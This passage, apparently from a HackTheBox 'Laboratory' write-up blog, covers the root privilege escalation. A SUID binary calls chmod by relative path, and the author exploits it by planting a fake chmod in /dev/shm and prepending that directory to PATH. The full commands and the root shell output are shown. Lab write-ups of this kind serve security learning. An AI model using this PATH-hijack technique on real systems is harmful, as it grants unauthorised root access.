</span></span><span class=line><span class=cl>dexter@laboratory:~$
</span></span><span class=line><span class=cl>dexter@laboratory:~$ id<span class=p>;</span>hostname
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>1000<span class=o>(</span>dexter<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>1000<span class=o>(</span>dexter<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>1000<span class=o>(</span>dexter<span class=o>)</span>
</span></span><span class=line><span class=cl>laboratory
</span></span><span class=line><span class=cl>dexter@laboratory:~$ ls -l
</span></span><span class=line><span class=cl>total <span class=m>4</span>
</span></span><span class=line><span class=cl>-r--r----- <span class=m>1</span> root dexter <span class=m>33</span> Mar <span class=m>22</span> 10:06 user.txt
</span></span></code></pre></div><h3 id=shell-as-root>Shell as root<a class=anchor aria-hidden=true href=#shell-as-root>#</a></h3><h4 id=enumeration-1>Enumeration<a class=anchor aria-hidden=true href=#enumeration-1>#</a></h4><p>The contents of <code>todo.txt</code> talks something about “docker security”, but I have no idea what it is except it uses three hashtags.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class=o>(</span>master<span class=o>)</span> ✗
</span></span><span class=line><span class=cl>$ cat dexter/todo.txt
</span></span><span class=line><span class=cl><span class=c1># DONE: Secure docker for regular users</span>
</span></span><span class=line><span class=cl><span class=c1>### DONE: Automate docker security on startup</span>
</span></span><span class=line><span class=cl><span class=c1># TODO: Look into &#34;docker compose&#34;</span>
</span></span><span class=line><span class=cl><span class=c1># TODO: Permanently ban DeeDee from lab#</span>
</span></span></code></pre></div><p>It turns out it’s a binary name which has a SUID bit set found by Linpeas.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>...&lt;SNIP&gt;...
</span></span><span class=line><span class=cl>════════════════════════════════════╣ Interesting Files ╠════════════════════════════════════
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> SUID - Check easy privesc, exploits and write perms                                                                                
</span></span><span class=line><span class=cl>-rwsr-xr-x <span class=m>1</span> root   dexter           17K Aug <span class=m>28</span>  <span class=m>2020</span> /usr/local/bin/docker-security
</span></span></code></pre></div><p>Inspecting the binary with the <code>ltrace</code> command reveals that it uses relative path to call <code>chmod</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>dexter@laboratory:~$ ltrace docker-security 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>setuid<span class=o>(</span>0<span class=o>)</span>                                                                                                <span class=o>=</span> -1
</span></span><span class=line><span class=cl>setgid<span class=o>(</span>0<span class=o>)</span>                                                                                                <span class=o>=</span> -1
</span></span><span class=line><span class=cl>system<span class=o>(</span><span class=s2>&#34;chmod 700 /usr/bin/docker&#34;</span>chmod: changing permissions of <span class=s1>&#39;/usr/bin/docker&#39;</span>: Operation not permitted
</span></span><span class=line><span class=cl> &lt;no <span class=k>return</span> ...&gt;
</span></span><span class=line><span class=cl>--- SIGCHLD <span class=o>(</span>Child exited<span class=o>)</span> ---
</span></span><span class=line><span class=cl>&lt;... system resumed&gt; <span class=o>)</span>                                                                                   <span class=o>=</span> <span class=m>256</span>
</span></span><span class=line><span class=cl>system<span class=o>(</span><span class=s2>&#34;chmod 660 /var/run/docker.sock&#34;</span>chmod: changing permissions of <span class=s1>&#39;/var/run/docker.sock&#39;</span>: Operation not permitted
</span></span><span class=line><span class=cl> &lt;no <span class=k>return</span> ...&gt;
</span></span><span class=line><span class=cl>--- SIGCHLD <span class=o>(</span>Child exited<span class=o>)</span> ---
</span></span><span class=line><span class=cl>&lt;... system resumed&gt; <span class=o>)</span>                                                                                   <span class=o>=</span> <span class=m>256</span>
</span></span><span class=line><span class=cl>+++ exited <span class=o>(</span>status 0<span class=o>)</span> +++
</span></span></code></pre></div><p>Knowing this, I could hijack the execution path.</p><h4 id=suid---path-hijack>SUID - Path Hijack<a class=anchor aria-hidden=true href=#suid---path-hijack>#</a></h4><p>First, I&rsquo;ll create a fake <code>chmod</code> that calls <code>bash</code> binary at <code>/dev/shm</code>, I&rsquo;ll also add an execute permission on that file.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>dexter@laboratory:~$ <span class=nb>cd</span> /dev/shm
</span></span><span class=line><span class=cl>dexter@laboratory:/dev/shm$ <span class=nb>echo</span> -e <span class=s1>&#39;#!/bin/bash\n/bin/bash&#39;</span> &gt; chmod
</span></span><span class=line><span class=cl>dexter@laboratory:/dev/shm$ /bin/chmod +x chmod
</span></span></code></pre></div><p>Next, I&rsquo;ll add current directory (<code>/dev/shm</code>) to <code>$PATH</code> variable. Now if I call <code>chmod</code>, it points to my <code>chmod</code> on <code>/dev/shm</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>dexter@laboratory:/dev/shm$ <span class=nb>export</span> <span class=nv>PATH</span><span class=o>=</span><span class=k>$(</span><span class=nb>pwd</span><span class=k>)</span>:<span class=nv>$PATH</span>
</span></span><span class=line><span class=cl>dexter@laboratory:/dev/shm$ which chmod
</span></span><span class=line><span class=cl>/dev/shm/chmod
</span></span></code></pre></div><p>And now I can just execute <code>docker-security</code> to obtain a root access as well as the root flag.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>dexter@laboratory:/dev/shm$ docker-security 
</span></span><span class=line><span class=cl>root@laboratory:/dev/shm#
</span></span><span class=line><span class=cl>root@laboratory:/dev/shm# cut -c6- /root/root.txt 
</span></span><span class=line><span class=cl>9f593f335a0a1f403c753719eb6
</span></span></code></pre></div><div class=post-references><h2>Reference</h2><ul><li><a href=https://hackerone.com/reports/827052 target=_blank rel="noopener noreferrer">https://hackerone.com/reports/827052</a></li></ul></div></div></div><footer class=post-footer><ul class=post-tags><li><a href=https://fahmifj.github.io/tags/linux/>Linux</a></li><li><a href=https://fahmifj.github.io/tags/gitlab/>GitLab</a></li><li><a href=https://fahmifj.github.io/tags/cve-2020-10977/>CVE-2020-10977</a></li><li><a href=https://fahmifj.github.io/tags/lfi/>LFI</a></li><li><a href=https://fahmifj.github.io/tags/lfi2rce/>LFI2RCE</a></li><li><a href=https://fahmifj.github.io/tags/metasploit/>Metasploit</a></li><li><a href=https://fahmifj.github.io/tags/recover-git/>Recover-git</a></li><li><a href=https://fahmifj.github.io/tags/deserialization/>Deserialization</a></li><li><a href=https://fahmifj.github.io/tags/path-hijack/>Path-hijack</a></li><li><a href=https://fahmifj.github.io/tags/suid/>SUID</a></li></ul><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Laboratory on twitter" href="https://twitter.com/intent/tweet/?text=HackTheBox%20-%20Laboratory&url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2flaboratory%2f&hashtags=Linux%2cGitLab%2cCVE-2020-10977%2cLFI%2cLFI2RCE%2cMetasploit%2cRecover-git%2cDeserialization%2cPath-hijack%2cSUID"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Laboratory on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2flaboratory%2f&title=HackTheBox%20-%20Laboratory&summary=HackTheBox%20-%20Laboratory&source=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2flaboratory%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Laboratory on reddit" href="https://reddit.com/submit?url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2flaboratory%2f&title=HackTheBox%20-%20Laboratory"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Laboratory on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2flaboratory%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Laboratory on whatsapp" href="https://api.whatsapp.com/send?text=HackTheBox%20-%20Laboratory%20-%20https%3a%2f%2ffahmifj.github.io%2fhackthebox%2flaboratory%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Laboratory on telegram" href="https://telegram.me/share/url?text=HackTheBox%20-%20Laboratory&url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2flaboratory%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></div></main><footer class=footer><span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a>&nbsp;&&nbsp;<a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a>&nbsp;(mod)</span>
<span><span class=copyright>&copy; 2022&nbsp;<a href=https://fahmifj.github.io/about>Fahmi FJ</a></span>
&nbsp;·&nbsp;
<span class=license><a href=https://creativecommons.org/licenses/by-nc-sa/4.0/>CC BY-NC-SA 4.0</a></span></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)"><button class=top-link id=top-link type=button accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></button></a>
<script>let menu=document.getElementById("menu");menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)},document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>